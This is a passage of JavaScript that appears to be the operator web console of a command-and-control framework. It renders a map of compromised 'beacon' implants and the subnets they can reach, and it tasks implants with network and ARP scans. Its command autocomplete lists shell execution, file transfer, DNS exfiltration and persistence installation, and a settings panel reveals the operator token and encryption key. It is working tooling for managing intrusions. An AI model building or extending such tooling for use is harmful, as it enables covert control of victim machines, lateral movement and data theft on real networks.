    let col = isSelected ? "#FFD700" : (isOnline ? "#33ff33" : "#555");
    let glow = isSelected ? "rgba(255,215,0,0.5)" : (isOnline ? "rgba(51,255,51,0.4)" : "none");
    const ips = (a.local_ips || currentInfo.local_ips || []).join(", ");
    pivotNodes.push({
      id: a.agent_id, type: "beacon", x, y,
      label: a.agent_id,
      sub: (a.user||"?")+"@"+(a.hostname||"?") + (ips ? "\n"+ips : ""),
      color: col, glow, status: a.status,
      link: "c2-server"
    });
  });

  const scanKey = selectedAgent || "";
  const scanResults = pivotScanData[scanKey] || [];
  const agentIps = new Set();
  allAgents.forEach(a => (a.local_ips||[]).forEach(ip => agentIps.add(ip)));

  const discovered = scanResults.filter(h => !agentIps.has(h.ip));
  if(discovered.length > 0){
    const beaconNode = pivotNodes.find(n => n.id === selectedAgent);
    const bx = beaconNode ? beaconNode.x : cx;
    const by = beaconNode ? beaconNode.y : cy;

    const boxPad = 35;
    const nodeSpacing = 80;
    const cols = Math.min(discovered.length, 4);
    const rows = Math.ceil(discovered.length / cols);
    const boxW = cols * nodeSpacing + boxPad * 2;
    const boxH = rows * nodeSpacing + boxPad * 2 + 24;
    const boxX = bx - boxW / 2;
    const boxY = by + 70;

    const subnet = discovered[0].ip.split(".").slice(0,3).join(".")+".0/24";
    pivotNodes.push({
      id: "subnet-"+scanKey, type: "subnet",
      x: boxX, y: boxY, w: boxW, h: boxH,
      label: subnet, beaconId: selectedAgent
    });

    discovered.forEach((h, i) => {
      const col = i % cols;
      const row = Math.floor(i / cols);
      const x = boxX + boxPad + col * nodeSpacing + nodeSpacing / 2;
      const y = boxY + boxPad + 24 + row * nodeSpacing + nodeSpacing / 2;
      const hasServices = h.ports && h.ports.length > 0;
      const hasOS = !!h.os_guess;
      let nodeColor = "#5588cc";
      if(hasOS && h.os_guess.includes("Windows")) nodeColor = "#4499dd";
      else if(hasOS && h.os_guess.includes("Linux")) nodeColor = "#55bb55";
      else if(hasOS && (h.os_guess.includes("macOS")||h.os_guess.includes("Apple"))) nodeColor = "#aaaaaa";
      else if(hasOS && h.os_guess.includes("Network")) nodeColor = "#dd8833";
      else if(hasOS && h.os_guess.includes("NAS")) nodeColor = "#bb66cc";
      const shortLabel = h.hostname ? h.hostname.split(".")[0] : h.ip.split(".").slice(2).join(".");
      pivotNodes.push({
        id: "host-"+h.ip, type: "host", x, y,
        label: shortLabel,
        sub: h.vendor || "",
        color: nodeColor, glow: nodeColor.replace(")", ",0.3)").replace("rgb","rgba"),
        link: selectedAgent,
        hostData: h
      });
    });
  }

  drawPivotCanvas();
}

function startPivotAnim(){
  if(pivotAnimId) return;
  function loop(ts){
    pivotTime = ts;
    drawPivotFrame();
    pivotAnimId = requestAnimationFrame(loop);
  }
  pivotAnimId = requestAnimationFrame(loop);
}

function stopPivotAnim(){
  if(pivotAnimId){ cancelAnimationFrame(pivotAnimId); pivotAnimId=null; }
}

function drawPivotCanvas(){
  startPivotAnim();
}

function drawPivotFrame(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas){ stopPivotAnim(); return; }
  if(!canvas.offsetParent){ stopPivotAnim(); return; }
  const rect = canvas.parentElement.getBoundingClientRect();
  const w = rect.width || 800;
  const h = Math.max(rect.height - 80, 400);
  if(canvas.width !== w) canvas.width = w;
  if(canvas.height !== h) canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.save();
  ctx.translate(pivotPan.x, pivotPan.y);
  ctx.scale(pivotZoom, pivotZoom);
  const t = pivotTime * 0.001;
  const mono = getComputedStyle(document.body).getPropertyValue("--mono");
  const sans = getComputedStyle(document.body).getPropertyValue("--sans");

  const edges = [];
  const subnetBeacons = new Set();
  pivotNodes.filter(n => n.type === "subnet").forEach(sn => subnetBeacons.add(sn.beaconId));

  pivotNodes.forEach(n => {
    if(!n.link) return;
    if(n.type === "host" && subnetBeacons.has(n.link)) return;
    const parent = pivotNodes.find(p => p.id === n.link);
    if(!parent) return;
    edges.push({from:parent, to:n, node:n});
  });

  pivotNodes.filter(n => n.type === "subnet").forEach(sn => {
    const beacon = pivotNodes.find(p => p.id === sn.beaconId);
    if(!beacon) return;
    const toX = sn.x + sn.w / 2;
    const toY = sn.y;
    edges.push({from:beacon, to:{x:toX, y:toY}, node:{type:"subnet-link", status:"online"}});
  });

  edges.forEach(e => {
    const n = e.node;
    const x1=e.from.x, y1=e.from.y, x2=e.to.x, y2=e.to.y;
    const offline = n.status === "offline";
    const isHost = n.type === "host" || n.type === "subnet-link";
    const lineColor = offline ? "rgba(85,85,85,0.4)" : (isHost ? "rgba(85,136,204,0.7)" : "rgba(255,26,26,0.8)");
    const glowColor = offline ? "transparent" : (isHost ? "rgba(85,136,204,0.25)" : "rgba(255,26,26,0.3)");
    const dashOff = t * (isHost ? 30 : 50);

    if(!offline){
      ctx.save();
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.strokeStyle = glowColor;
      ctx.lineWidth = 10;
      ctx.lineCap = "round";
      ctx.shadowColor = glowColor;
      ctx.shadowBlur = 18;
      ctx.setLineDash([]);
      ctx.stroke();
      ctx.restore();
    }

    ctx.save();
    ctx.beginPath();
    ctx.moveTo(x1, y1);
    ctx.lineTo(x2, y2);
    ctx.strokeStyle = lineColor;
    ctx.lineWidth = offline ? 1 : (isHost ? 2 : 2.5);
    ctx.lineCap = "round";
    if(isHost){
      ctx.setLineDash([6, 6]);
      ctx.lineDashOffset = -dashOff;
    } else {
      ctx.setLineDash([]);
    }
    ctx.stroke();
    ctx.restore();

    if(!offline){
      ctx.save();
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.strokeStyle = offline ? "transparent" : "rgba(255,255,255,0.15)";
      ctx.lineWidth = isHost ? 1 : 1.2;
      ctx.lineCap = "round";
      ctx.setLineDash([2, 12]);
      ctx.lineDashOffset = -dashOff * 1.5;
      ctx.stroke();
      ctx.restore();
    }

    if(!offline){
      const dx = x2-x1, dy = y2-y1;
      const len = Math.sqrt(dx*dx+dy*dy);
      if(len < 10) return;
      const nx = dx/len, ny = dy/len;
      const speed = isHost ? 0.3 : 0.5;
      const packetCount = isHost ? 1 : 2;
      const pktColor = isHost ? "rgba(85,136,204,0.9)" : "rgba(255,100,100,0.95)";
      const pktGlow = isHost ? "rgba(85,136,204,0.5)" : "rgba(255,26,26,0.6)";
      for(let p=0; p<packetCount; p++){
        const phase = (t * speed + p * (1.0/packetCount)) % 1.0;
        const px = x1 + dx * phase;
        const py = y1 + dy * phase;
        ctx.save();
        ctx.shadowColor = pktGlow;
        ctx.shadowBlur = 8;
        ctx.beginPath();
        ctx.arc(px, py, 3, 0, Math.PI*2);
        ctx.fillStyle = pktColor;
        ctx.fill();
        ctx.restore();
      }
    }
  });

  // ── Subnet boxes ──
  pivotNodes.filter(n => n.type === "subnet").forEach(sn => {
    const bx = sn.x, by = sn.y, bw = sn.w, bh = sn.h;
    const dashOff = t * 20;

    ctx.save();
    ctx.shadowColor = "rgba(85,136,204,0.2)";
    ctx.shadowBlur = 20;
    ctx.fillStyle = "rgba(10,18,35,0.55)";
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.fill();
    ctx.restore();

    ctx.save();
    ctx.strokeStyle = "rgba(85,136,204,0.5)";
    ctx.lineWidth = 1.5;
    ctx.setLineDash([8, 5]);
    ctx.lineDashOffset = -dashOff;
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.stroke();
    ctx.restore();

    ctx.save();
    ctx.strokeStyle = "rgba(85,136,204,0.15)";
    ctx.lineWidth = 4;
    ctx.setLineDash([]);
    ctx.shadowColor = "rgba(85,136,204,0.15)";
    ctx.shadowBlur = 12;
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.stroke();
    ctx.restore();

    ctx.font = "bold 10px " + sans;
    ctx.fillStyle = "rgba(85,136,204,0.8)";
    ctx.textAlign = "left";
    ctx.fillText("🌐 " + sn.label, bx + 10, by + 14);

    const hostCount = pivotNodes.filter(n => n.type === "host" && n.link === sn.beaconId).length;
    ctx.font = "9px " + mono;
    ctx.fillStyle = "rgba(85,136,204,0.5)";
    ctx.textAlign = "right";
    ctx.fillText(hostCount + " device" + (hostCount !== 1 ? "s" : ""), bx + bw - 10, by + 14);
  });

  // ── Nodes ──
  pivotNodes.forEach(n => {
    if(n.type === "subnet") return;
    const r = n.type === "c2" ? 22 : (n.type === "beacon" ? 18 : 12);
    const pulse = 1 + Math.sin(t * 2) * 0.08;
    const rr = n.type === "host" ? r : r * pulse;

    if(n.glow && n.glow !== "none"){
      ctx.save();
      const grad = ctx.createRadialGradient(n.x, n.y, rr*0.5, n.x, n.y, rr*2.2);
      grad.addColorStop(0, n.glow);
      grad.addColorStop(1, "transparent");
      ctx.beginPath();
      ctx.arc(n.x, n.y, rr*2.2, 0, Math.PI*2);
      ctx.fillStyle = grad;
      ctx.fill();
      ctx.restore();
    }

    ctx.save();
    ctx.shadowColor = n.glow || "transparent";
    ctx.shadowBlur = 12;
    ctx.beginPath();
    ctx.arc(n.x, n.y, rr, 0, Math.PI*2);
    ctx.fillStyle = n.color;
    ctx.fill();
    ctx.shadowBlur = 0;
    ctx.restore();

    ctx.beginPath();
    ctx.arc(n.x, n.y, rr, 0, Math.PI*2);
    ctx.strokeStyle = "rgba(255,255,255,0.2)";
    ctx.lineWidth = 1.5;
    ctx.stroke();

    if(n.type === "c2"){
      ctx.font = "16px serif";
      ctx.fillStyle = "#fff";
      ctx.textAlign = "center";
      ctx.fillText("🦝", n.x, n.y + 5);
    } else if(n.type === "beacon"){
      ctx.font = "bold 10px " + mono;
      ctx.fillStyle = "#000";
      ctx.textAlign = "center";
      ctx.fillText("B", n.x, n.y + 4);
    } else {
      ctx.font = "9px " + mono;
      ctx.fillStyle = "#fff";
      ctx.textAlign = "center";
      ctx.fillText("H", n.x, n.y + 3);
    }

    ctx.font = (n.type === "host" ? "10px " : "bold 11px ") + sans;
    ctx.fillStyle = n.color;
    ctx.textAlign = "center";
    if(n.type !== "host"){
      ctx.shadowColor = n.color;
      ctx.shadowBlur = 6;
    }
    ctx.fillText(n.label, n.x, n.y + rr + 12);
    ctx.shadowBlur = 0;

    if(n.sub){
      ctx.font = "9px " + mono;
      ctx.fillStyle = "rgba(208,212,220,0.5)";
      const subLines = n.sub.split("\n");
      subLines.forEach((line, i) => {
        ctx.fillText(line, n.x, n.y + rr + 23 + i * 11);
      });
    }
  });

  ctx.restore();

  if(!canvas._eventsAttached){
    canvas._eventsAttached = true;
    canvas.addEventListener("mousedown", pivotMouseDown);
    canvas.addEventListener("mousemove", pivotMouseMove);
    canvas.addEventListener("mouseup", pivotMouseUp);
    canvas.addEventListener("mouseleave", pivotMouseUp);
    canvas.addEventListener("wheel", pivotWheel, {passive:false});
    canvas.addEventListener("click", pivotClick);
  }
}

function pivotScreenToWorld(sx, sy){
  return { x: (sx - pivotPan.x) / pivotZoom, y: (sy - pivotPan.y) / pivotZoom };
}

function pivotMouseDown(e){
  pivotDidDrag = false;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  const sx = e.clientX - rect.left;
  const sy = e.clientY - rect.top;
  const w = pivotScreenToWorld(sx, sy);

  for(const n of pivotNodes){
    if(n.type === "subnet") continue;
    const dx = w.x - n.x, dy = w.y - n.y;
    const hitR = 600 / (pivotZoom * pivotZoom);
    if(dx*dx + dy*dy < hitR){
      pivotDrag = {node: n, offX: dx, offY: dy};
      canvas.style.cursor = "grabbing";
      return;
    }
  }
  pivotPanStart = {x: e.clientX - pivotPan.x, y: e.clientY - pivotPan.y};
  canvas.style.cursor = "grabbing";
}

function pivotMouseMove(e){
  pivotDidDrag = true;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  if(pivotDrag){
    const sx = e.clientX - rect.left;
    const sy = e.clientY - rect.top;
    pivotDrag.node.x = (sx - pivotPan.x) / pivotZoom - pivotDrag.offX;
    pivotDrag.node.y = (sy - pivotPan.y) / pivotZoom - pivotDrag.offY;
  } else if(pivotPanStart){
    pivotPan.x = e.clientX - pivotPanStart.x;
    pivotPan.y = e.clientY - pivotPanStart.y;
  }
}

function pivotMouseUp(e){
  pivotDrag = null;
  pivotPanStart = null;
  if(e.target.tagName === "CANVAS") e.target.style.cursor = "grab";
}

function pivotClick(e){
  if(pivotDidDrag) return;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  const sx = e.clientX - rect.left;
  const sy = e.clientY - rect.top;
  const w = pivotScreenToWorld(sx, sy);

  for(const n of pivotNodes){
    if(n.type === "subnet") continue;
    const dx = w.x - n.x, dy = w.y - n.y;
    if(dx*dx + dy*dy < 400){
      showNodeTooltip(n, e.clientX, e.clientY);
      return;
    }
  }
  dismissTooltip();
}

function dismissTooltip(){
  const wrap = document.getElementById("pivot-tooltip-wrap");
  if(wrap) wrap.innerHTML = "";
}

function showNodeTooltip(node, mx, my){
  const wrap = document.getElementById("pivot-tooltip-wrap");
  if(!wrap) return;

  const wRect = wrap.getBoundingClientRect();
  const tipX = Math.max(0, Math.min(mx - wRect.left + 12, wRect.width - 280));
  const tipY = Math.max(0, Math.min(my - wRect.top - 40, wRect.height - 200));

  let html = '<div class="pivot-tooltip" style="left:'+tipX+'px;top:'+tipY+'px;position:absolute">';

  if(node.type === "c2"){
    html += '<div class="tt-header"><span class="tt-dot" style="background:#ff1a1a;box-shadow:0 0 6px #ff1a1a"></span>';
    html += '<span class="tt-title">C2 Server</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    html += '<div class="tt-row"><span class="tt-lbl">Address</span><span class="tt-val">'+esc(window.location.host)+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Protocol</span><span class="tt-val">'+esc(window.location.protocol.replace(":",""))+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Role</span><span class="tt-val highlight">Team Server</span></div>';
    html += '</div>';
  } else if(node.type === "beacon"){
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+';box-shadow:0 0 6px '+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(node.label)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    const sub = (node.sub||"").split("\n");
    if(sub[0]) html += '<div class="tt-row"><span class="tt-lbl">Identity</span><span class="tt-val">'+esc(sub[0])+'</span></div>';
    if(sub[1]) html += '<div class="tt-row"><span class="tt-lbl">IPs</span><span class="tt-val">'+esc(sub[1])+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Status</span><span class="tt-val '+(node.status==="online"?"highlight":"warn")+'">'+esc(node.status||"?")+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">Type</span><span class="tt-val">Implant Beacon</span></div>';
    html += '</div>';
  } else if(node.type === "host" && node.hostData){
    const d = node.hostData;
    const criticalPorts = new Set([21,23,135,139,445,3389,5900,5985]);
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+';box-shadow:0 0 6px '+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(d.hostname||d.ip)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    html += '<div class="tt-row"><span class="tt-lbl">IP</span><span class="tt-val">'+esc(d.ip)+'</span></div>';
    if(d.hostname) html += '<div class="tt-row"><span class="tt-lbl">Hostname</span><span class="tt-val">'+esc(d.hostname)+'</span></div>';
    html += '<div class="tt-row"><span class="tt-lbl">MAC</span><span class="tt-val">'+esc(d.mac||"?")+'</span></div>';
    if(d.vendor) html += '<div class="tt-row"><span class="tt-lbl">Vendor</span><span class="tt-val highlight">'+esc(d.vendor)+'</span></div>';
    if(d.os_guess) html += '<div class="tt-row"><span class="tt-lbl">OS Guess</span><span class="tt-val warn">'+esc(d.os_guess)+'</span></div>';
    if(d.type && d.type !== "?") html += '<div class="tt-row"><span class="tt-lbl">ARP Type</span><span class="tt-val">'+esc(d.type)+'</span></div>';
    if(d.ports && d.ports.length){
      html += '<div class="tt-section">Open Ports ('+d.ports.length+')</div>';
      html += '<div class="tt-ports">';
      (d.port_info||d.ports.map(String)).forEach(p => {
        const portNum = parseInt(p);
        const isCrit = criticalPorts.has(portNum);
        html += '<span class="tt-port'+(isCrit?" critical":"")+'">'+esc(String(p))+'</span>';
      });
      html += '</div>';
    }
    if(d.banners && Object.keys(d.banners).length){
      html += '<div class="tt-section">Banners</div>';
      Object.entries(d.banners).forEach(([port, banner]) => {
        html += '<div class="tt-banner"><strong>:'+esc(port)+'</strong> '+esc(banner)+'</div>';
      });
    }
    if(!d.ports || !d.ports.length){
      html += '<div class="tt-section">Info</div>';
      html += '<div style="font-size:10px;color:var(--text2);padding:2px 0">No open ports detected. Run Scan Subnet for deeper probe.</div>';
    }
    html += '</div>';
  } else {
    html += '<div class="tt-header"><span class="tt-dot" style="background:'+node.color+'"></span>';
    html += '<span class="tt-title">'+esc(node.label)+'</span>';
    html += '<button class="tt-close" onclick="dismissTooltip()">&#10005;</button></div>';
    html += '<div class="tt-body">';
    if(node.sub) html += '<div class="tt-row"><span class="tt-lbl">Info</span><span class="tt-val">'+esc(node.sub)+'</span></div>';
    html += '</div>';
  }
  html += '</div>';
  wrap.innerHTML = html;
}

function pivotWheel(e){
  e.preventDefault();
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
  const mx = e.clientX - rect.left;
  const my = e.clientY - rect.top;
  const delta = e.deltaY > 0 ? 0.9 : 1.1;
  pivotApplyZoom(delta, mx, my);
}

function pivotApplyZoom(factor, cx, cy){
  const oldZ = pivotZoom;
  pivotZoom = Math.max(0.15, Math.min(5, pivotZoom * factor));
  const ratio = pivotZoom / oldZ;
  pivotPan.x = cx - (cx - pivotPan.x) * ratio;
  pivotPan.y = cy - (cy - pivotPan.y) * ratio;
  updateZoomLabel();
}

function pivotZoomIn(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas) return;
  pivotApplyZoom(1.25, canvas.width/2, canvas.height/2);
}

function pivotZoomOut(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas) return;
  pivotApplyZoom(0.8, canvas.width/2, canvas.height/2);
}

function pivotFitAll(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas || !pivotNodes.length) return;
  let minX=Infinity, minY=Infinity, maxX=-Infinity, maxY=-Infinity;
  pivotNodes.forEach(n => {
    if(n.type === "subnet"){
      minX = Math.min(minX, n.x);
      minY = Math.min(minY, n.y);
      maxX = Math.max(maxX, n.x + n.w);
      maxY = Math.max(maxY, n.y + n.h);
    } else {
      const r = 40;
      minX = Math.min(minX, n.x - r);
      minY = Math.min(minY, n.y - r);
      maxX = Math.max(maxX, n.x + r);
      maxY = Math.max(maxY, n.y + r + 40);
    }
  });
  const pad = 40;
  minX -= pad; minY -= pad; maxX += pad; maxY += pad;
  const bw = maxX - minX;
  const bh = maxY - minY;
  const cw = canvas.width;
  const ch = canvas.height;
  pivotZoom = Math.min(cw / bw, ch / bh, 2);
  pivotPan.x = (cw - bw * pivotZoom) / 2 - minX * pivotZoom;
  pivotPan.y = (ch - bh * pivotZoom) / 2 - minY * pivotZoom;
  updateZoomLabel();
}

function updateZoomLabel(){
  const el = document.getElementById("pivot-zoom-label");
  if(el) el.textContent = Math.round(pivotZoom * 100) + "%";
}

async function runNetScan(){
  if(!selectedAgent) return;
  toast("info","Pivot","Network scan started...",3000);
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"netscan", args:"", data:""})
  });
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(pollNetScanResult, 2000);
  pollHistory(selectedAgent);
}

async function runArpScan(){
  if(!selectedAgent) return;
  toast("info","Pivot","ARP table requested...",3000);
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"arptable", args:"", data:""})
  });
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(pollArpResult, 2000);
  pollHistory(selectedAgent);
}

async function pollNetScanResult(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="netscan");
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }

  if(last.status==="ok" && last.output){
    const hosts = [];
    last.output.split("\n").forEach(line => {
      const m = line.match(/^\s+([\d.]+)(?:\s+\(([^)]+)\))?\s+ports:\[([^\]]*)\]/);
      if(m){
        hosts.push({
          ip: m[1],
          hostname: m[2]||"",
          ports: m[3] ? m[3].split(",").map(Number).filter(Boolean) : []
        });
      }
    });
    pivotScanData[selectedAgent] = hosts;
    toast("success","Pivot","Found "+hosts.length+" hosts",4000);
  }
  refreshPivotMap();
}

async function pollArpResult(){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="arptable");
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }

  if(last.status==="ok" && last.output){
    let parsed;
    try{ parsed = JSON.parse(last.output); }catch(e){ parsed = null; }
    if(parsed && parsed.entries){
      const seen = new Set();
      const hosts = parsed.entries.filter(e => {
        if(e.self) return false;
        const o = parseInt(e.ip);
        if(o >= 224 || o === 127) return false;
        if(seen.has(e.ip)) return false;
        seen.add(e.ip);
        return true;
      }).map(e => ({
        ip: e.ip, hostname: e.hostname||"", mac: e.mac||"",
        vendor: e.vendor||"", os_guess: e.os_guess||"",
        ports: e.ports||[], port_info: e.port_info||[],
        banners: e.banners||{}, type: e.type||""
      }));
      const existing = pivotScanData[selectedAgent] || [];
      const existingIps = new Set(existing.map(h => h.ip));
      hosts.forEach(h => {
        if(existingIps.has(h.ip)){
          const old = existing.find(o => o.ip === h.ip);
          if(old) Object.assign(old, h);
        } else {
          existing.push(h);
        }
      });
      pivotScanData[selectedAgent] = existing;
      toast("success","Pivot","ARP: "+hosts.length+" devices discovered",4000);
    }
  }
  refreshPivotMap();
}

async function refreshPivotMap(){
  if(!selectedAgent) return;
  const info = await api("/api/agents/"+selectedAgent);
  const allAgents = await api("/api/agents");
  buildPivotGraph(info, allAgents);
}

// ── Autocomplete ──
const AC_COMMANDS = [
  {cmd:"shell", hint:"Execute shell command", args:true},
  {cmd:"ls", hint:"List directory", args:true},
  {cmd:"cat", hint:"Read file", args:true},
  {cmd:"pwd", hint:"Print working directory", args:false},
  {cmd:"cd", hint:"Change directory", args:true},
  {cmd:"cp", hint:"Copy file", args:true},
  {cmd:"mv", hint:"Move/rename file", args:true},
  {cmd:"rm", hint:"Remove file/directory", args:true},
  {cmd:"mkdir", hint:"Create directory", args:true},
  {cmd:"chmod", hint:"Change permissions", args:true},
  {cmd:"write", hint:"Write text to file", args:true},
  {cmd:"upload", hint:"Upload file to agent", args:true},
  {cmd:"download", hint:"Download file from agent", args:true},
  {cmd:"exfil", hint:"Exfiltrate via DNS", args:true},
  {cmd:"sleep", hint:"Set interval + jitter", args:true},
  {cmd:"persist", hint:"Install persistence", args:true},
  {cmd:"unpersist", hint:"Remove persistence", args:true},
  {cmd:"netscan", hint:"Scan local subnet", args:true},
  {cmd:"arptable", hint:"Show ARP neighbors", args:false},
  {cmd:"kill", hint:"Terminate beacon", args:false},
];

let acItems = [];
let acIdx = -1;

function getCompletions(text){
  const parts = text.split(/\s+/);
  const cmd = parts[0]||"";
  if(parts.length<=1){
    return AC_COMMANDS.filter(c => c.cmd.startsWith(cmd)).map(c => ({value:c.cmd, hint:c.hint}));
  }
  const partial = parts[parts.length-1]||"";
  const pathCmds = ["ls","cat","cd","cp","mv","rm","mkdir","chmod","download","upload","write","exfil","shell"];
  if(!pathCmds.includes(cmd)) return [];
  const known = collectKnownPaths();
  return known.filter(p => p.startsWith(partial)||p.includes(partial))
    .slice(0,12)
    .map(p => ({value: parts.slice(0,-1).join(" ")+" "+p, hint:"path"}));
}

function collectKnownPaths(){
  const paths = new Set();
  cmdHistory.forEach(h => {
    const p = h.split(/\s+/).slice(1);
    p.forEach(a => { if(a.startsWith("/")||a.startsWith("./")) paths.add(a); });
  });
  if(typeof fbPath!=="undefined" && fbPath) paths.add(fbPath);
  return [...paths].sort();
}

function updateAutocomplete(){
  const input = document.getElementById("cmd-input");
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");
  if(!input||!dd) return;
  const text = input.value;
  if(!text){ dd.classList.remove("open"); ghost.textContent=""; acItems=[]; return; }
  acItems = getCompletions(text);
  acIdx = -1;
  if(!acItems.length){ dd.classList.remove("open"); ghost.textContent=""; return; }
  ghost.textContent = acItems[0].value;
  dd.innerHTML = "";
  acItems.forEach((item,i) => {
    const el = document.createElement("div");
    el.className = "ac-item";
    el.innerHTML = esc(item.value)+'<span class="hint">'+esc(item.hint)+'</span>';
    el.onmousedown = e => { e.preventDefault(); input.value=item.value; dd.classList.remove("open"); ghost.textContent=""; input.focus(); };
    dd.appendChild(el);
  });
  dd.classList.add("open");
}

function handleInputKey(e){
  const input = document.getElementById("cmd-input");
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");

  if(e.key==="Tab"){
    e.preventDefault();
    if(acItems.length>0){
      const pick = acIdx>=0 ? acItems[acIdx] : acItems[0];
      input.value = pick.value;
      dd.classList.remove("open");
      ghost.textContent = "";
      acItems = [];
    }
    return;
  }
  if(e.key==="Enter"){
    dd.classList.remove("open");
    ghost.textContent = "";
    sendCmd();
    e.preventDefault();
    return;
  }
  if(e.key==="Escape"){
    dd.classList.remove("open");
    ghost.textContent = "";
    acItems = [];
    return;
  }
  if(dd.classList.contains("open")){
    if(e.key==="ArrowDown"){
      e.preventDefault();
      acIdx = Math.min(acIdx+1, acItems.length-1);
      highlightAcItem();
      return;
    }
    if(e.key==="ArrowUp" && acIdx>=0){
      e.preventDefault();
      acIdx--;
      highlightAcItem();
      return;
    }
  }
  if(e.key==="ArrowUp"){
    e.preventDefault();
    if(cmdIdx<cmdHistory.length-1){cmdIdx++;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}
  } else if(e.key==="ArrowDown"){
    e.preventDefault();
    if(cmdIdx>0){cmdIdx--;input.value=cmdHistory[cmdHistory.length-1-cmdIdx]||""}
    else{cmdIdx=-1;input.value=""}
  }
}

function highlightAcItem(){
  const dd = document.getElementById("ac-dropdown");
  const ghost = document.getElementById("ac-ghost");
  if(!dd) return;
  [...dd.children].forEach((el,i) => el.classList.toggle("selected", i===acIdx));
  if(acIdx>=0 && acItems[acIdx]) ghost.textContent = acItems[acIdx].value;
}

// ── Settings panel ──
let settingsOpen = false;

function toggleSettings(){
  const panel = document.getElementById("settings-panel");
  if(!panel) return;
  settingsOpen = !settingsOpen;
  panel.classList.toggle("open", settingsOpen);
  if(settingsOpen) loadSettings();
}

document.addEventListener("click", e => {
  const panel = document.getElementById("settings-panel");
  const wrap = e.target.closest(".gear-wrap");
  if(panel && panel.classList.contains("open") && !wrap){
    panel.classList.remove("open");
    settingsOpen = false;
  }
});

async function loadSettings(){
  const body = document.getElementById("settings-body");
  if(!body) return;
  try{
    const cfg = await api("/api/server/config");
    const proto = cfg.ssl ? "https" : "http";
    const listen = proto+"://"+cfg.host+":"+cfg.port;
    const keyStatus = cfg.key_type === "default"
      ? '<span class="cfg-value warn">DEFAULT (insecure!)</span>'
      : '<span class="cfg-value ok">'+esc(cfg.key_type)+'</span>';
    const sslStatus = cfg.ssl
      ? '<span class="cfg-value secure">&#128274; Enabled'+(cfg.cert?' ('+esc(cfg.cert)+')':' (self-signed)')+'</span>'
      : '<span class="cfg-value warn">&#128275; Disabled</span>';
    const keyPreview = cfg.enc_key.length > 20 ? cfg.enc_key.substring(0,20)+"..." : cfg.enc_key;

    body.innerHTML = `
      <div class="cfg-section">
        <div class="cfg-section-title">&#127760; Network</div>
        <div class="cfg-row"><span class="cfg-label">Listen</span><span class="cfg-value">${esc(listen)}</span></div>
        <div class="cfg-row"><span class="cfg-label">SSL/TLS</span>${sslStatus}</div>
        <div class="cfg-row"><span class="cfg-label">GUI</span><span class="cfg-value">${esc(proto+"://localhost:"+cfg.port)}</span></div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128274; Security</div>
        <div class="cfg-row">
          <span class="cfg-label">Encryption</span>${keyStatus}
        </div>
        <div class="cfg-row">
          <span class="cfg-label">Enc Key</span>
          <span class="cfg-value" id="cfg-enc-key" style="cursor:pointer" title="Click to reveal">${esc(keyPreview)}</span>
          <button class="cfg-copy" onclick="copyToClipboard('${esc(cfg.enc_key)}','Encryption key')">copy</button>
        </div>
        <div class="cfg-row">
          <span class="cfg-label">Token</span>
          <span class="cfg-value" style="cursor:pointer" onclick="this.textContent=this.dataset.full||this.textContent" data-full="${esc(cfg.operator_token)}">${esc(cfg.operator_token.substring(0,12)+"...")}</span>
          <button class="cfg-copy" onclick="copyToClipboard('${esc(cfg.operator_token)}','Operator token')">copy</button>
        </div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128193; Storage</div>
        <div class="cfg-row"><span class="cfg-label">Data Dir</span><span class="cfg-value">${esc(cfg.data_dir)}</span></div>
      </div>
      <div class="cfg-section">
        <div class="cfg-section-title">&#128202; Statistics</div>
        <div class="cfg-row"><span class="cfg-label">Uptime</span><span class="cfg-uptime">${formatUptime(cfg.uptime)}</span></div>
        <div class="cfg-stats-row">
